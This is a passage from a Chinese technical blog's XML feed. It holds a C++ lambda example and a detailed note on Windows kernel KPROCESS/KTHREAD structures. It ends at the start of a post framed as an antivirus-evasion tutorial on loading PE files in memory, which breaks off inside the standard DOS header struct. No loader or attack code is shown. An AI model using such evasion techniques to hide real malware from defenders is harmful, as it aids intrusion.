class="type">int</span>&gt; greater20&#123;<span class="number">20</span>&#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, greater20 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="lambda表达式"><a class="markdownIt-Anchor" href="#lambda表达式"></a> lambda表达式</h1><p>这个我再Qt上用的挺多的，他是匿名函数的实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="keyword">auto</span> greater20 = [](<span class="keyword">auto</span> &amp;val) -&gt; <span class="type">bool</span> &#123; <span class="keyword">return</span> val &gt; <span class="number">20</span>; &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, greater20 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;C++的函数进化小结&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="cpp" scheme="https://joe1sn.eu.org/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>【win内核原理与实现】II. 进程与线程</title>
    <link href="https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&amp;thread/"/>
    <id>https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&amp;thread/</id>
    <published>2023-06-14T01:41:52.000Z</published>
    <updated>2023-06-14T03:10:04.422Z</updated>
    
    <content type="html"><![CDATA[<p>Windows中进程与线程的设置</p><span id="more"></span><h1 id="关于进程与线程"><a class="markdownIt-Anchor" href="#关于进程与线程"></a> 关于进程与线程</h1><h2 id="操作系统复习"><a class="markdownIt-Anchor" href="#操作系统复习"></a> 操作系统“复习”</h2><p>​在学习操作系统的时候，有个重点就是进程与线程的区别。最开始进程和线程是没有分开的，由于多数操作系统分开了用户态和内核态，那么用户态就必须和内核态进行交互才能调用系统资源（通过IOCTL交互）。这样每一个进程在内核当中都有一个“进程描述符”的东西来描述这个进程，并根据调度算法完成进程的运行。这里就假设一个进程<code>test.exe</code>调用了<strong>0x40</strong>大小的内存空间，在<strong>只有</strong>进程的时候，进程描述符中就会标记这个内存被这个进程使用，同时指令和运行都在其中。<br />​这样有个问题就是，我需要两个这种“进程”来运行，且他们需要的恰好是同一块内存的相同数据，如果只有进程的话，就会存在两个0x40的内存，同时造成不必要的复制粘贴。随后就有了<strong>线程</strong>这个概念，比如面对上述情况，进程就只含有一个0x40大小的内存，对内存的访问就交给这个线程对应的进程。</p><h2 id="进程和程序"><a class="markdownIt-Anchor" href="#进程和程序"></a> 进程和程序</h2><p>​Windows的任务调度算法可以很好地适应多处理器和多任务的情形，在windows中的进程也遵守上述的准则。对于Windows内核需要做的事情是：<strong>维护一个全局的进程表</strong>，记录下当前有哪些进程正 在被执行；<strong>把时间分成适当的片段</strong>，在现代处理器结构中，这可以通过设置时钟中断来完成，因而每次时钟中断到来时系统就会获得控制权；<strong>在进程间实施切换</strong>，即保留上一个进 程的环境信息，恢复下一个进程的执行环境。关于Windows的调度算法可以简单理解为时间轮。</p><p>​如果程序是一个完全的模块，那么他的内存就是我们熟悉的经典内存结构。</p><img src="https://img.joe1sn.top/uploads/big/58d86fa1e2cc5aee1ae0b8da258a64d3.png" alt="image-20230614104209374" style="zoom:50%;" /><p>​但是往往一个最简单的helloworld也会调用CRunTime的代码，所以有进程就能使用 <strong>共享内存</strong> ，比如在静态数据区有着一份复制。</p><h2 id="线程"><a class="markdownIt-Anchor" href="#线程"></a> 线程</h2><p>​线程不仅仅是一个控制流，它还有更多的内容。线程的调用栈（call stack）记录了它 作为控制流的状态信息，包括每一层函数调用和返回的指令地址。线程一定隶属于某个进 程，其控制流可以访问这个进程中的资源，包括所有的内存数据以及系统分配给此进程的 其他资源。一个进程可以有多个线程，由于这些线程隶属于同一个进程，所以它们之间相 互通信要方便得多，毕竟几乎所有的资源（并非全部）对于它们来说都是共享的。</p><h1 id="windows-中进程和线程的数据结构"><a class="markdownIt-Anchor" href="#windows-中进程和线程的数据结构"></a> Windows 中进程和线程的数据结构</h1><h2 id="内核层的进程和线程对象"><a class="markdownIt-Anchor" href="#内核层的进程和线程对象"></a> 内核层的进程和线程对象</h2><p>在内核当中的描述为<code>KPROCESS</code>和<code>KTHREAD</code>。</p><p>在WRK中的定义为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     DISPATCHER_HEADER Header;<span class="comment">//表明是分发器对象，可用于等待。进程退出时，此对象为有信号状态</span></span><br><span class="line">     LIST_ENTRY ProfileListHead;<span class="comment">//进程参与性能分析时，作为节点加入全局性能分析进程链表。</span></span><br><span class="line">     ULONG DirectoryTableBase;<span class="comment">// 两个成员的数组，第一个指向页目录表地址，第二个指向超空间的页目录表地址</span></span><br><span class="line">     ULONG Unused0;</span><br><span class="line">     KGDTENTRY LdtDescriptor;<span class="comment">//LDT的描述符</span></span><br><span class="line">     KIDTENTRY Int21Descriptor;<span class="comment">//为了兼容DOS，通过int 21h调用系统功能</span></span><br><span class="line">     WORD IopmOffset;<span class="comment">//指定IOPM（IO权限表，IO Privilege Map）位置。控制进程的用户模式IO访问权限</span></span><br><span class="line">     UCHAR Iopl;<span class="comment">//IO优先级（IO Privilege Level）</span></span><br><span class="line">     UCHAR Unused;</span><br><span class="line">     ULONG ActiveProcessors;<span class="comment">//记录进程正在哪些处理器上运行</span></span><br><span class="line">     ULONG KernelTime;<span class="comment">//在内核模式运行所花时间</span></span><br><span class="line">     ULONG UserTime;<span class="comment">//在用户模式运行所花时间</span></span><br><span class="line">     LIST_ENTRY ReadyListHead;<span class="comment">//保存进程中处于就绪状态但未被加入全局就绪链表的线程</span></span><br><span class="line">     SINGLE_LIST_ENTRY SwapListEntry;<span class="comment">//进程要被换出时，通过此域加入到KiProcessOutSwapListHead为头的单链表</span></span><br><span class="line">     PVOID VdmTrapcHandler;<span class="comment">//VDM环境下运行16位程序时，处理Ctrl+C中断的函数</span></span><br><span class="line">     LIST_ENTRY ThreadListHead;<span class="comment">//指向一个链表头，链表中包含该进程的所有线程</span></span><br><span class="line">     ULONG ProcessLock;<span class="comment">//一个自旋锁对象。保证对进程数据结构中成员的互斥访问</span></span><br><span class="line">     ULONG Affinity;<span class="comment">//指定该进程的线程可以在哪些处理器上运行</span></span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG AutoAlignment: <span class="number">1</span>;</span><br><span class="line">          ULONG DisableBoost: <span class="number">1</span>;<span class="comment">//</span></span><br><span class="line">          ULONG DisableQuantum: <span class="number">1</span>;</span><br><span class="line">          ULONG ReservedFlags: <span class="number">29</span>;</span><br><span class="line">          LONG ProcessFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR BasePriority;<span class="comment">//该进程的线程的基本优先级</span></span><br><span class="line">     CHAR QuantumReset;<span class="comment">//进程中线程的基本时限重置值</span></span><br><span class="line">     UCHAR State;<span class="comment">//说明进程是否在内存中</span></span><br><span class="line">     UCHAR ThreadSeed;<span class="comment">//该进程的下一个创建线程的理想处理器</span></span><br><span class="line">     UCHAR PowerState;<span class="comment">//电源状态</span></span><br><span class="line">     UCHAR IdealNode;<span class="comment">//进程优先选择的处理器节点</span></span><br><span class="line">     UCHAR Visited;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KEXECUTE_OPTIONS Flags;</span><br><span class="line">          UCHAR ExecuteOptions;<span class="comment">//NX执行选项</span></span><br><span class="line">     &#125;;</span><br><span class="line">     ULONG StackCount;<span class="comment">//当前进程中有多少个线程的栈位于内存中</span></span><br><span class="line">     LIST_ENTRY ProcessListEntry;<span class="comment">//当前系统中所有具有活动线程的进程通过这个域串成一个链表</span></span><br><span class="line">     UINT64 CycleTime;</span><br><span class="line">&#125; KPROCESS, *PKPROCESS;</span><br></pre></td></tr></table></figure><p>那么在线程当中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     DISPATCHER_HEADER Header;</span><br><span class="line">     UINT64 CycleTime;</span><br><span class="line">     ULONG HighCycleTime;</span><br><span class="line">     UINT64 QuantumTarget;</span><br><span class="line">     PVOID InitialStack;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID KernelStack;</span><br><span class="line">     ULONG ThreadLock;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC_STATE ApcState;</span><br><span class="line">          UCHAR ApcStateFill[<span class="number">23</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR Priority;</span><br><span class="line">     WORD NextProcessor;</span><br><span class="line">     WORD DeferredProcessor;</span><br><span class="line">     ULONG ApcQueueLock;</span><br><span class="line">     ULONG ContextSwitches;</span><br><span class="line">     UCHAR State;</span><br><span class="line">     UCHAR NpxState;</span><br><span class="line">     UCHAR WaitIrql;</span><br><span class="line">     CHAR WaitMode;</span><br><span class="line">     LONG WaitStatus;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          PKWAIT_BLOCK WaitBlockList;</span><br><span class="line">          PKGATE GateObject;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG KernelStackResident: <span class="number">1</span>;</span><br><span class="line">          ULONG ReadyTransition: <span class="number">1</span>;</span><br><span class="line">          ULONG ProcessReadyQueue: <span class="number">1</span>;</span><br><span class="line">          ULONG WaitNext: <span class="number">1</span>;</span><br><span class="line">          ULONG SystemAffinityActive: <span class="number">1</span>;</span><br><span class="line">          ULONG Alertable: <span class="number">1</span>;</span><br><span class="line">          ULONG GdiFlushActive: <span class="number">1</span>;</span><br><span class="line">          ULONG Reserved: <span class="number">25</span>;</span><br><span class="line">          LONG MiscFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR WaitReason;</span><br><span class="line">     UCHAR SwapBusy;</span><br><span class="line">     UCHAR Alerted[<span class="number">2</span>];</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          LIST_ENTRY WaitListEntry;</span><br><span class="line">          SINGLE_LIST_ENTRY SwapListEntry;</span><br><span class="line">     &#125;;</span><br><span class="line">     PKQUEUE Queue;</span><br><span class="line">     ULONG WaitTime;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               SHORT KernelApcDisable;</span><br><span class="line">               SHORT SpecialApcDisable;</span><br><span class="line">          &#125;;</span><br><span class="line">          ULONG CombinedApcDisable;</span><br><span class="line">     &#125;;</span><br><span class="line">     PVOID Teb;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KTIMER Timer;</span><br><span class="line">          UCHAR TimerFill[<span class="number">40</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG AutoAlignment: <span class="number">1</span>;</span><br><span class="line">          ULONG DisableBoost: <span class="number">1</span>;</span><br><span class="line">          ULONG EtwStackTraceApc1Inserted: <span class="number">1</span>;</span><br><span class="line">          ULONG EtwStackTraceApc2Inserted: <span class="number">1</span>;</span><br><span class="line">          ULONG CycleChargePending: <span class="number">1</span>;</span><br><span class="line">          ULONG CalloutActive: <span class="number">1</span>;</span><br><span class="line">          ULONG ApcQueueable: <span class="number">1</span>;</span><br><span class="line">          ULONG EnableStackSwap: <span class="number">1</span>;</span><br><span class="line">          ULONG GuiThread: <span class="number">1</span>;</span><br><span class="line">          ULONG ReservedFlags: <span class="number">23</span>;</span><br><span class="line">          LONG ThreadFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KWAIT_BLOCK WaitBlock[<span class="number">4</span>];</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill0[<span class="number">23</span>];</span><br><span class="line">               UCHAR IdealProcessor;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill1[<span class="number">47</span>];</span><br><span class="line">               CHAR PreviousMode;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill2[<span class="number">71</span>];</span><br><span class="line">               UCHAR ResourceIndex;</span><br><span class="line">          &#125;;</span><br><span class="line">          UCHAR WaitBlockFill3[<span class="number">95</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR LargeStack;</span><br><span class="line">     LIST_ENTRY QueueListEntry;</span><br><span class="line">     PKTRAP_FRAME TrapFrame;</span><br><span class="line">     PVOID FirstArgument;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          PVOID CallbackStack;</span><br><span class="line">          ULONG CallbackDepth;</span><br><span class="line">     &#125;;</span><br><span class="line">     PVOID ServiceTable;</span><br><span class="line">     UCHAR ApcStateIndex;</span><br><span class="line">     CHAR BasePriority;</span><br><span class="line">     CHAR PriorityDecrement;</span><br><span class="line">     UCHAR Preempted;</span><br><span class="line">     UCHAR AdjustReason;</span><br><span class="line">     CHAR AdjustIncrement;</span><br><span class="line">     UCHAR Spare01;</span><br><span class="line">     CHAR Saturation;</span><br><span class="line">     ULONG SystemCallNumber;</span><br><span class="line">     ULONG Spare02;</span><br><span class="line">     ULONG UserAffinity;</span><br><span class="line">     PKPROCESS Process;</span><br><span class="line">     ULONG Affinity;</span><br><span class="line">     PKAPC_STATE ApcStatePointer[<span class="number">2</span>];</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC_STATE SavedApcState;</span><br><span class="line">          UCHAR SavedApcStateFill[<span class="number">23</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR FreezeCount;</span><br><span class="line">     CHAR SuspendCount;</span><br><span class="line">     UCHAR UserIdealProcessor;</span><br><span class="line">     UCHAR Spare03;</span><br><span class="line">     UCHAR Iopl;</span><br><span class="line">     PVOID Win32Thread;</span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC SuspendApc;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill0[<span class="number">1</span>];</span><br><span class="line">               CHAR Spare04;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill1[<span class="number">3</span>];</span><br><span class="line">               UCHAR QuantumReset;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill2[<span class="number">4</span>];</span><br><span class="line">               ULONG KernelTime;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill3[<span class="number">36</span>];</span><br><span class="line">               PKPRCB WaitPrcb;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill4[<span class="number">40</span>];</span><br><span class="line">               PVOID LegoData;</span><br><span class="line">          &#125;;</span><br><span class="line">          UCHAR SuspendApcFill5[<span class="number">47</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR PowerState;</span><br><span class="line">     ULONG UserTime;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KSEMAPHORE SuspendSemaphore;</span><br><span class="line">          UCHAR SuspendSemaphorefill[<span class="number">20</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     ULONG SListFaultCount;</span><br><span class="line">     LIST_ENTRY ThreadListEntry;</span><br><span class="line">     LIST_ENTRY MutantListHead;</span><br><span class="line">     PVOID SListFaultAddress;</span><br><span class="line">     PVOID MdlForLockedTeb;</span><br><span class="line">&#125; KTHREAD, *PKTHREAD;</span><br></pre></td></tr></table></figure><p>Header：说明该对象是一个分发器对象，可以被等待。线程结束时，等待被满足。</p><p>MutantListHead：指向一个链表头。链表中包含所有属于该线程的突变体对象（mutant，对应互斥体对象）。</p><p>InitialStack：原始栈位置（高地址）</p><p>StackLimit：栈低地址</p><p>KernelStack：内核调用栈开始位置</p><p>StackBase：当前栈的基地址。</p><p>ThreadLock：自旋锁，用于保护线程数据成员。</p><p>ApcState：KAPC_STATE结构，指定线程的APC信息，包括APC链表，是否有APC正在等待，是否正在处理APC。</p><p>ApcQueueable：是否可插入APC</p><p>NextProcessor：关于处理器调度的选择。</p><p>DeferredProcessor：关于处理器调度的选择。</p><p>AdjustReason：优先级调整原因</p><p>AdjustIncrement：优先级调整调整量</p><p>ApcQueueLock：保护APC队列的自旋锁。</p><p>ContextSwitches：记录线程进行了多少次切换。</p><p>State：线程当前状态。</p><p>NpxState：浮点处理器状态。</p><p>Alertable：线程是否可以被唤醒。</p><p>WaitNext：</p><p>WaitIrql：原先的IRQL。</p><p>WaitReason：等待原因</p><p>WaitMode：线程等待时的处理器模式，内核or用户</p><p>WaitStatus：等待的结果状态。</p><p>WaitBlockList：KWAIT_BLOCK为元素的链表，记录线程所有等待的分发器对象。每个分发器对象也有一个KWAIT_BLOCK组成的链表，记录所有等待在该对象的线程。</p><p>GateObject：等待的门对象，等待门对象和等待分发器对象不会同时发生。</p><p>Priority：动态优先级。</p><p>BasePriority：基本优先级。</p><p>PriorityDecrement：优先级动态调整过程中的递减值。</p><p>Saturation：线程基本优先级调整相对于进程基本优先级是否超过了区间的一半。</p><p>EnableStackSwap：内核栈是否准许被换出。</p><p>SwapBusy：当前是否正在进程上下文切换。</p><p>Alerted：线程在警告模式下是否可以被唤醒。</p><p>WaitListEntry：双向链表节点，等待被执行时，作为节点加入某链表</p><p>SwapListEntry：单链表节点，内核栈需要被换出时，加入KiStackInSwapListHead为头的链表。另外，线程处于DeferredReady状态时加入DeferredReadyListHead为头的链表。</p><p>Queue：队列分发器对象，线程正在处理此队列中的项。</p><p>WaitTime：线程进入等待时刻的时间点。</p><p>KernelApcDisable/SpecialApcDisable：内核APC和特殊内核APC是否被禁止。</p><p>TEB：进程地址空间的一个TEB域</p><p>Timer：定时器。</p><p>AutoAlignment：与KPROCESS相同</p><p>DisableBoost：与KPROCESS相同</p><p>WaitBlock：4个KWAIT_BLOCK成员的数组，线程等待的分发器少于4个时，使用这里的空间，不分配新空间。</p><p>QueueListEntry：线程处理一个队列项时，加入到队列对象的线程链表中的地址。</p><p>TrapFrame：指向KTRAP_FRAME类型的指针。用户保存执行现场。</p><p>CallbackStack：线程的回调栈地址，在从内核模式返回用户模式时用。</p><p>ServiceTable： 指向系统使用的系统服务表，非GUI线程为KeServiceDescriptorTable，GUI线程为KeServiceDescriptorTableShadow。</p><p>IdealProcess：理想处理器</p><p>Preempted：是否被高优先级线程抢占了。</p><p>ProcessReadyQueue：是否在进程对象的ReadyListHead列表中。</p><p>KernelStackResident：线程的内核栈是否驻留在线程中。</p><p>Affinity：处理器亲和性，为线程指定的处理器集合必须是该集合的子集。</p><p>UserAffinity：线程的用户亲和性。</p><p>Process：执行线程的进程对象。</p><p>ApcStateIndex：指明当前APC状态在ApcStatePointer域中的索引。</p><p>Win32Thread：指向Windows子系统管理的区域的指针。</p><p>SuspendApc/SuspendSemaphore：用于支持线程挂起的域。</p><p>ThreadListEntry：双链表的节点，线程被创建时，加入到进程的ThreadListHead链表中。</p><p>SListFaultAddress：上一次用户模式互锁单链表POP操作发生页面错误的地址。</p><p>SuspendSemaphore：与上面有关。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows中进程与线程的设置&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】内存加载PE文件</title>
    <link href="https://joe1sn.eu.org/2023/06/13/pe-loader/"/>
    <id>https://joe1sn.eu.org/2023/06/13/pe-loader/</id>
    <published>2023-06-13T00:46:20.000Z</published>
    <updated>2023-06-13T05:14:54.198Z</updated>
    
    <content type="html"><![CDATA[<p>使用windows API编写PE文件加载器（Loader）<br />目前支支持32位</p><span id="more"></span><h1 id="pe文件结构"><a class="markdownIt-Anchor" href="#pe文件结构"></a> PE文件结构</h1><p>在《逆向工程核心原理》中讲的已经很详细了，这里主要面向32位的可执行程序来讲解。</p><p><img src="https://img.joe1sn.top/uploads/big/0cdf49890a47067a93b43fd16ec19448.png" alt="MZ" /></p><p>DOS头和PE头统称为PE头，下面的部分称之为PE体。</p><h2 id="dos头"><a class="markdownIt-Anchor" href="#dos头"></a> DOS头</h2><p>DOS头的文件结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// 文件最后一页的字节数</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// 文件中的页数</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// 重定位</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// 段中头大小</span></span><br><span 